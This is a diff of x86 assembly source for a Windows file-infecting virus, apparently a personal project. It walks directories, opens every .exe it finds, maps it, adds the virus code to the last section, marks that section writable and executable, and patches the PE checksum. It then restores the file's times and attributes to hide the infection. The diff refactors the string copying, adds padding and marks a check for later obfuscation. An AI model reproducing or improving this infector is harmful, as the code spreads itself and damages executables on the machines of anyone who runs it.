@@ -36,17 +36,13 @@ struc DATA
     .SetFileTime:             resd 1
     .UnmapViewOfFile:         resd 1
     .WriteFile:               resd 1
-    .lstrcat:                 resd 1
-    .lstrcpy:                 resd 1
 
     ; directory listing data
     .findData:                resb FIND_DATA.size
-    .fileMask:                resb 5 ; to store "\*.*"
-    .backslash:               resb 2 ; "\", 0   ; 0x5C ; "\"
     .findHandle:              resd 1
     .counter:                 resd 1 ; COUNT
-    .currentPath:             resb MAX_PATH_LENGTH
     .searchPath:              resb MAX_PATH_LENGTH  
+    .edi:                     resd 1
 
     ; infection data
     .fileAlign:               resd 1
@@ -83,7 +79,7 @@ endstruc
 
 %if DEBUG
 section .data
-     counter                  dd 1
+     counter    dd 1
 %endif
 
 section .text
@@ -100,10 +96,8 @@ anchor:
     push    ebp                                 ; save old ebp
     sub     esp, DATA.size                      ; allocate local variables
     mov     ebp, esp                            ; set ebp for variable indexing
-    ;PRINTH  "ebp", ebp
-    ;PRINTH  "esp", esp
 
-    mov [ebp + DATA.EIP], eax                   ; save location EIP
+    mov     [ebp + DATA.EIP], eax               ; save location EIP
 
     ; Figure out kernel32.dll's location
     mov     edi, [FS : 0x30]                    ; PEB
@@ -189,61 +183,42 @@ discard:
     ;; ====================================================================================
 
     ; initialize local variables    
-    mov     [ebp + DATA.fileMask], dword 0x00002A5C ; "\*" 
-    PRINTS  "fileMask", [ebp + DATA.fileMask]
-    mov     [ebp + DATA.backslash], word 0x005C ; "\"    
     mov     [ebp + DATA.counter], dword COUNT
 
     ; push initial path onto the stack
-    sub     esp, MAX_PATH_LENGTH
-    mov     edx, esp
-    mov     ebx, [ebp + DATA.EIP]
-    add     ebx, directory - anchor
-    push    ebx
-    push    edx
-    call    [ebp + DATA.lstrcpy]
-    ;PRINTS  "startPath", [ebx]
+    sub     esp, MAX_PATH_LENGTH                    
+    mov     edi, esp
+    mov     esi, [ebp + DATA.EIP]
+    add     esi, directory - anchor
+    call    strcpy  
+    stosb                                           ; append 0 terminator
     
 next_dir:
-    cmp     ebp, esp            ; must be fixed when ported
+    cmp     ebp, esp                                ; check if the path stack is empty
     je      search_done
-    
-    push    esp                 ; pop path off the stack
-    lea     edx, [ebp + DATA.currentPath]
-    push    edx
-    call    [ebp + DATA.lstrcpy]
+       
+    mov     esi, esp                                ; pop path off the stack and copy into searchPath
+    lea     edi, [ebp + DATA.searchPath]    
     add     esp, MAX_PATH_LENGTH
-    ;PRINTS  "currentPath", [ebp + DATA.currentPath]
+    call    strcpy
+    mov     eax, 0x00002A5C                         ; append the file mask "\*"
+    stosd                                           ; this moves esi by 4
+    mov     [ebp + DATA.edi], edi                   ; save edi for later
     
-    lea     edx, [ebp + DATA.currentPath]   ; copy currentPath into searchPath
-    push    edx
-    lea     edx, [ebp + DATA.searchPath] 
-    push    edx
-    call    [ebp + DATA.lstrcpy]
-    ;PRINTS  "searchPath", [ebp + DATA.searchPath]
-    
-    lea     edx, [ebp + DATA.fileMask]            ; append the file mask
-    push    edx
-    lea     edx, [ebp + DATA.searchPath]
-    push    edx
-    call    [ebp + DATA.lstrcat]
-    ;PRINTS  "searchPath", [ebp + DATA.searchPath]
-    
-    lea     edx, [ebp + DATA.findData]           ; find the first file
+    lea     edx, [ebp + DATA.findData]              ; find the first file
     push    edx
     lea     edx, [ebp + DATA.searchPath]
     push    edx
     call    [ebp + DATA.FindFirstFileA]
-    cmp     eax, -1             ; invalid handle? 
-    je      next_dir            ; no need to close the search, just move on
+    cmp     eax, -1                                 ; invalid handle? 
+    je      next_dir                                ; no need to close the search, just move on
     mov     [ebp + DATA.findHandle], eax
-    jmp     process_file        ; else process the file
+    jmp     process_file                            ; else process the file
     
 next_file:
     lea     edx, [ebp + DATA.findData]
     push    edx
-    mov     eax, [ebp + DATA.findHandle]
-    push    eax
+    push    dword [ebp + DATA.findHandle]
     call    [ebp + DATA.FindNextFileA]
     cmp     eax, 0
     je      close_search
@@ -255,43 +230,23 @@ process_file:
     cmp     word [ebp + DATA.findData + FIND_DATA.cFileName], word 0x2e2e
     je      next_file
     
-    lea     edx, [ebp + DATA.currentPath]         ; get file absolute path
-    push    edx
-    lea     edx, [ebp + DATA.searchPath]
-    push    edx
-    call    [ebp + DATA.lstrcpy]
-    lea     edx, [ebp + DATA.backslash]
-    push    edx
-    lea     edx, [ebp + DATA.searchPath]
-    push    edx
-    call    [ebp + DATA.lstrcat]
-    lea     edx, [ebp + DATA.findData + FIND_DATA.cFileName]
-    push    edx
-    lea     edx, [ebp + DATA.searchPath]
-    push    edx
-    call    [ebp + DATA.lstrcat]
+    mov     edi, [ebp + DATA.edi]                 ; restore edi
+    sub     edi, 4                                ; remove last 4 bytes added (\*00)
+    mov     al, 0x5C                              ; append "\"
+    stosb
     
-    mov     eax, [ebp + DATA.findData + FIND_DATA.dwFileAttributes]
-    and     eax, DIRECTORY 
-    cmp     eax, DIRECTORY      ; directory?
-    je      dir                 ; then its a dir
+    lea     esi, [ebp + DATA.findData + FIND_DATA.cFileName]       ; append fileName
+    call    strcpy
+    stosb                                                          ; append 0 terminator
+                                                                                                             
+    bt      dword [ebp + DATA.findData + FIND_DATA.dwFileAttributes], 4  ; check if a directory, see DIRECTORY const
+    jc      dir
     
-    ; else its a file and check if exe
-    xor     eax, eax
-loop_findTermination:
-    mov     bl, byte [ebp + DATA.findData + FIND_DATA.cFileName + eax]
-    cmp     bl, 0
-    je      compareEXE    
-    inc     eax
-    jmp     loop_findTermination    
-    
-compareEXE:
-    mov     ebx, dword ".exe"
-    mov     ecx, dword [ebp + DATA.findData + FIND_DATA.cFileName + eax - 4]    
-    cmp     ebx, ecx   
+    ; its a file, check if .exe
+    cmp     [edi - 5], dword ".exe"  ; TODO obfuscate this
     jne     next_file
 
-    ; IF FILE AND EXE, THEN INFECT
+    ; it is .exe, infect
     PRINTS  "FILE", [ebp + DATA.searchPath]    
     call    InfectFile
     
@@ -301,25 +256,26 @@ compareEXE:
     
 dir:
     sub     esp, MAX_PATH_LENGTH
-    mov     ebx, esp
-    lea     edx, [ebp + DATA.searchPath]
-    push    edx
-    push    ebx
-    call    [ebp + DATA.lstrcpy]
+    lea     esi, [ebp + DATA.searchPath]
+    mov     edi, esp
+    call    strcpy  
+    stosb                                           ; append 0 terminator
+        
     jmp     next_file
     
 close_search:
-    ;findData "closeSearch", [ebp + DATA.currentPath]
-    mov     eax, [ebp + DATA.findHandle]
-    push    eax
+    push    dword [ebp + DATA.findHandle]
     call    [ebp + DATA.FindClose]
     jmp     next_dir
 
 search_done:
+    %if DEBUG
     mov     eax, COUNT
     sub     eax, [ebp + DATA.counter]
-    NEWLINE
     PRINTD "counter", eax
+    %endif
+    
+    NOPS
 
     ;; Now the payload of the virus
     ;; ====================================================================================
@@ -353,26 +309,31 @@ search_done:
 ;; HELPER FUNCTIONS
 ;; ====================================================================================
 
+;; Infects a file
+;;  Input: ecx = filesize
 InfectFile:
-    pushad                                          ; Save all registers
 
-    xor     ebx, ebx
-    mov     [ebp + DATA.infectionFlag], ebx         ; Reset the infection flag
+    NOPS
     
+    pushad                                          ; Save all registers
+    
+    xor     edi, edi
+
+    mov     [ebp + DATA.infectionFlag], di     ; Reset the infection flag
+
     mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow] ; read file size (lower 4 bytes)
     PRINTD "originalFileSize", ecx
-    mov     [ebp + DATA.newFileSize], ecx           ; YYY Save file size, old size at this point
-    add     ecx, virusLen                           ; ECX = victim filesize + virus
-    add     ecx, 1000h                              ; ECX = victim filesize + virus + 1000h
+    mov     [ebp + DATA.newFileSize], ecx           ; Save file size, old size at this point
+    add     ecx, virusLen + 1000h                   ; ECX = victim filesize + virus + 1000h
     mov     [ebp + DATA.memoryToReserve], ecx       ; Memory to map
-    PRINTD "memoryToReserve", ecx
+    PRINT_TRACE ;1
 
     ;; save the original attributes
 
     lea     ebx, [ebp + DATA.searchPath]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.GetFileAttributesA]         ; Get the file attributes
-    cmp     eax, -1                                 ; YYY
+    cmp     eax, edi
     mov     [ebp + DATA.fileAttributes], eax
     PRINTH  "fileAttributes", eax
 
@@ -385,25 +346,25 @@ InfectFile:
 
     ;; open the file
 
-    push    0                                       ; File template
-    push    0                                       ; File attributes
+    push    edi                                       ; File template
+    push    edi                                       ; File attributes
     push    3                                       ; Open existing file
-    push    0                                       ; Security option = default
+    push    edi                                       ; Security option = default
     push    1                                       ; File share for read
-    mov     ebx, WRITABLE
-    or      ebx, READABLE
-    push    ebx                                     ; General write and read
+    push    GENERIC_READ | GENERIC_WRITE            ; General write and read
     lea     ebx, [ebp + DATA.searchPath]
     push    ebx                                     ; Address to filename
-    call    [ebp + DATA.CreateFileA]                ; create the file, EAX = file handle
-    cmp     eax, -1                                 ; error ?
-    je      InfectionError                          ; cant open the file ?
+    call    [ebp + DATA.CreateFileA]                ; create the file
+                                                    ; EAX = file handle
+
     mov     [ebp + DATA.fileHandle], eax            ; Save file handle
+    cmp     eax, -1                                 ; error ?
+    je      OutOfHere                               ; cant open the file ?
     PRINTH  "fileHandle", eax
 
     ;; save File creation time, Last write time, Last access time
 
-    lea     ebx, [ebp + DATA.lastWriteTime]
+    lea     ebx, [ebp + DATA.lastWriteTime]         ; TODO add instructions might be better
     push    ebx
     lea     ebx, [ebp + DATA.lastAccessTime]
     push    ebx
@@ -411,48 +372,33 @@ InfectFile:
     push    ebx
     mov     ebx, [ebp + DATA.fileHandle]
     push    ebx
-    call    [ebp + DATA.GetFileTime]                
-    PRINTD  "GetFileTime", eax
+    call    [ebp + DATA.GetFileTime]                ; save time fields FIXME
 
     ;; create file mapping for the file
-;HANDLE WINAPI CreateFileMapping(
-;  _In_     HANDLE                hFile,
-;  _In_opt_ LPSECURITY_ATTRIBUTES lpAttributes,
-;  _In_     DWORD                 flProtect,
-;  _In_     DWORD                 dwMaximumSizeHigh,
-;  _In_     DWORD                 dwMaximumSizeLow,
-;  _In_opt_ LPCTSTR               lpName
-;);
-;
-    push    0                                       ; Filename handle = NULL
-    mov     ebx, [ebp + DATA.memoryToReserve]           ; Max size
-    push    ebx
-    push    0                                       ; Min size (no need)
+    xor     eax, eax
+
+    push    edi                                       ; Filename handle = NULL
+    push    dword [ebp + DATA.memoryToReserve]      ; Max size
+    push    edi                                       ; Min size (no need)
     push    4                                       ; Page read and write
-    push    0                                       ; Security attributes
-    mov     ebx, [ebp + DATA.fileHandle]            ; File handle
-    push    ebx
-    call    [ebp + DATA.CreateFileMappingA]         ; map file to memory, EAX = new map handle
-    call    _GetLastError@0
-    PRINTD  "CreateFileMapping handle", eax
-    cmp     eax, 0                                  ; Error ?
-    je      CloseFile                               ; Cant map file ?
+    push    edi                                       ; Security attributes
+    push    dword [ebp + DATA.fileHandle]           ; File handle
+    call    [ebp + DATA.CreateFileMappingA]         ; map file to memory                                                    ; EAX = new map handle
+    PRINTD  "FileMapping handle", eax
     mov     [ebp + DATA.mapHandle], eax             ; Save map handle
-    ;PRINTD  "CreateFileMapping handle", eax
+    cmp     eax, edi                                  ; Error ?
+    je      CloseFile                               ; Cant map file ?
 
     ;; map the view of that file
 
     PRINTD "memoryToReserve", [ebp + DATA.memoryToReserve]
-    mov     ebx, [ebp + DATA.memoryToReserve]           ; # Bytes to map
-    push    ebx
-    push    0                                       ; File offset low
-    push    0                                       ; File offset high
+    push    dword [ebp + DATA.memoryToReserve]      ; # Bytes to map
+    push    edi                                       ; File offset low
+    push    edi                                       ; File offset high
     push    2                                       ; File Map Write Mode
-    mov     ebx, [ebp + DATA.mapHandle]             ; File Map Handle
-    push    ebx
+    push    dword [ebp + DATA.mapHandle]            ; File Map Handle
     call    [ebp + DATA.MapViewOfFile]              ; map file to memory
-
-    cmp     eax, 0                                  ; Error ?
+    cmp     eax, edi                                  ; Error ?
     je      CloseMap                                ; Cant map view of file ?
     mov     esi, eax                                ; ESI = base of file mapping
     mov     [ebp + DATA.mapAddress], esi            ; Save base of file mapping
@@ -470,16 +416,14 @@ InfectFile:
 OkGo:
     mov     ebx, [esi + DOS.lfanew]                 ; EBX = PE Header RVA
     cmp     word [esi + ebx], EP                    ; 'EP'  ; Is it a PE file ?
-    jne     UnmapView                               ; Error ?
-    PRINT_TRACE ;2
+    jne     UnmapView                               ; Error ?    
 
     ;; If the file is not EXE, is already infected or is not a PE file, we proceed to
     ;; unmap the view of file, otherwise parse the PE Header.
 
     add     esi, ebx                                ; (ESI points to PE header now)
     mov     [ebp + DATA.PEHeader], esi              ; Save PE header
-    mov     eax, [esi + PE.Machine]                 ; read machine field in PE Header
-    cmp     ax, INTEL386                            ; 0x014c = Intel 386
+    cmp     [esi + PE.Machine], word INTEL386       ; read machine field in PE Header, 0x014c = Intel 386
     jnz     UnmapView                               ; if not 32 bit, then error and quit
     mov     eax, [esi + PE.AddressOfEntryPoint]     
     mov     [ebp + DATA.oldEntryPoint], eax         ; Save Entry Point of file
@@ -487,7 +431,7 @@ OkGo:
     mov     [ebp + DATA.imageBase], eax             ; Save the Image Base
     mov     eax, [esi + PE.FileAlignment]
     mov     dword [ebp + DATA.fileAlign], eax       ; Save File Alignment ; (EAX = File Alignment)
-    PRINT_TRACE ;3
+    PRINTH  "fileAlign", eax
     
     mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries, PE + 0x74
     shl     ebx, 3                                  ; * 8 (size of data directories)
@@ -534,9 +478,9 @@ OkGo:
 
     PRINT_TRACE ;8
 
-    pop   ebx                                       ; restore old PE header into ebx
+    pop     ebx                                     ; restore old PE header into ebx
 
-    or      dword [esi + SECTIONH.Characteristics], CODE | EXECUTABLE   ; Set [CWE] flags (CODE)
+    or      dword [esi + SECTIONH.Characteristics], CODE | GENERIC_EXECUTE   ; Set [CWE] flags (CODE)
 
     ;; The flags tell the loader that the section now
     ;; has executable code and is writable
@@ -694,14 +638,12 @@ OkGo:
     PRINTH  "newChecksum", eax            
     
 UnmapView:
-    mov     ebx, [ebp + DATA.mapAddress]
-    push    ebx
+    push    dword [ebp + DATA.mapAddress]
     call    [ebp + DATA.UnmapViewOfFile]
     PRINT_TRACE
 
 CloseMap:
-    mov     ebx, [ebp + DATA.mapHandle]
-    push    ebx
+    push    dword [ebp + DATA.mapHandle]
     call    [ebp + DATA.CloseHandle]
     PRINT_TRACE
 
@@ -719,57 +661,43 @@ CloseFile:
 
     ;; In order to properly close the file we must set its EOF at the exact end
     ;; of file, So first we move the pointer to the end and set the EOF
-
+    
     push    0                                       ; First we must set the file
     push    NULL                                    ; Pointer at the end of file (that is the beginning + new file size)
-    mov     ebx, [ebp + DATA.newFileSize]
-    push    ebx
-    mov     ebx, [ebp + DATA.fileHandle]
-    push    ebx
+    push    dword [ebp + DATA.newFileSize]
+    push    dword [ebp + DATA.fileHandle]
     call    [ebp + DATA.SetFilePointer]
     PRINT_TRACE
 
-    mov     ebx, [ebp + DATA.fileHandle]
-    push    ebx
+    push    dword [ebp + DATA.fileHandle]
     call    [ebp + DATA.SetEndOfFile]
     PRINT_TRACE
 
     ;; And finaly we close the file
 
-    mov     ebx, [ebp + DATA.fileHandle]
-    push    ebx
+    push    dword [ebp + DATA.fileHandle]
     call    [ebp + DATA.CloseHandle]
     PRINT_TRACE
 
     ;; Then we must restore file attributes
 
-    mov     ebx, [ebp + DATA.fileAttributes]
-    push    ebx
+    push    dword [ebp + DATA.fileAttributes]
     lea     ebx, [ebp + DATA.searchPath]
     push    ebx                                     ; Push the address of the search record
     PRINT_TRACE
     call    [ebp + DATA.SetFileAttributesA]
     PRINT_TRACE
 
-    jmp     InfectionSuccessful
-
-InfectionError:
-    stc
-    jmp     OutOfHere
-
 InfectionSuccessful:
     PRINT_TRACE
-    mov     eax, 15
     cmp     word[ebp + DATA.infectionFlag], AD
-    je      InfectionError
-    clc                                             ; clear CARRY flag
+    je      OutOfHere
 
 OutOfHere:
-  PRINT_TRACE
-    popad                                           ; Restore all registers
-  
+    popad                                           ; Restore all registers  
     retn
 
+    NOPS
 
 ;; Calculates the checksum that is to be stored in the PE header
 ;;  Input:  edx - buffer pointer, ecx - buffer length
@@ -799,11 +727,24 @@ PECheckSum:
     
     retn 
 
+; Copies a zero terminated string from esi to edi
+; Input : esi - pointer to source, edi - pointer to destination
+; Output: al = 0 so string can be terminated simply by doing 'stosb'!
+strcpy:    
+    lodsb
+    cmp     al, 0
+    jz      end_strcpy
+    stosb
+    jmp     strcpy
+end_strcpy:
+    retn  
+
+    NOPS
 
     ;; Constant data section
     ;; ====================================================================================
 
-    directory:                db "C:\assembly\Dummies", 0
+    directory:                db "C:\assembly\build", 0
     message:                  db 'Good morning America!', 10
     message_end:
 
@@ -825,8 +766,6 @@ PECheckSum:
      SetFileTime:             dd 0xae24e4cb
      UnmapViewOfFile:         dd 0x7f75f35b
      WriteFile:               dd 0x2398d9db ; delete
-     lstrcat:                 dd 0x1bf64771
-     lstrcpy:                 dd 0x1bf64947
 
 
     NOPS
